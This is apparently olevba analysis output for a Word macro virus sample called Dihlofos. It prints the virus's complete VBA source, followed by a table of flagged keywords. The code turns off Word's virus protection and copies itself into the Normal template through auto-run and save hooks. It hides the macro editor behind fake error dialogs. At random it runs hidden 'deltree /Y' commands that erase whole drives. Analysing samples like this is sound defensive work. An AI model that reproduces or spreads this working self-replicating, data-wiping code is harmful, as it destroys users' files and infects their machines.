olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Dihlo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Dihlo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DIHLOFOS.bas 
in file: ./Virus.MSWord.Dihlo - OLE stream: 'Macros/VBA/DIHLOFOS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'**************************
'    This is virus        *
'Version: 1.0             *
'   Name: Dihlofos        *
'  Autor: Kiselov Maxim   *
'   Date: 28.06.2001      *
'Made in: Russia          *
'**************************
Sub AutoOpen()
Call Infect
End Sub
Sub ErrorBox()
Dim Msg, MSGer, Style, Title
Msg = Error(51)
Title = "Error 51"
Style = 0 + 16
MSGer = MsgBox(Msg, Style, Title)
End Sub
Sub Infect()
On Error Resume Next
Dim File$
Dim ThisFile$
Dim MyV
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ThisFile$ = WordBasic.[FileName$]()
Set myTemplate = ActiveDocument.AttachedTemplate
File$ = myTemplate.Path & Application.PathSeparator & _
myTemplate.Name
Application.OrganizerCopy Source:=ThisFile$, Destination:=File$, Name:="DIHLOFOS", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=File$, Destination:=ThisFile$, Name:="DIHLOFOS", Object:=wdOrganizerObjectProjectItems
MyV = Int((500 * Rnd) + 1)
If MyV = 17 Then Call Distructive
End Sub
Sub ToolsMacro()
Call ErrorBox
End Sub
Sub AutoClose()
Call Infect
End Sub
Sub FileSaveAs()
Call Infect
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
Call Infect
ActiveDocument.Save
End Sub
Sub Distructive()
On Error Resume Next
MsgBox Title:="Virus DIHLOFOS", Prompt:="Ha ha ha ha...You System DEAD!"
If Application.UserName = "Киселёв Максим Сергеевич" Then End
Shell "Command.com /c deltree /Y C:\", vbHide
Shell "Command.com /c deltree /Y D:\", vbHide
Shell "Command.com /c deltree /Y E:\", vbHide
Shell "Command.com /c deltree /Y A:\", vbHide
Shell "Command.com /c deltree /Y B:\", vbHide
End Sub
Sub ToolsCustomize()
Call ErrorBox
End Sub
Sub ToolsOptions()
Call ErrorBox
End Sub
Sub ViewVbCode()
Call ErrorBox
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

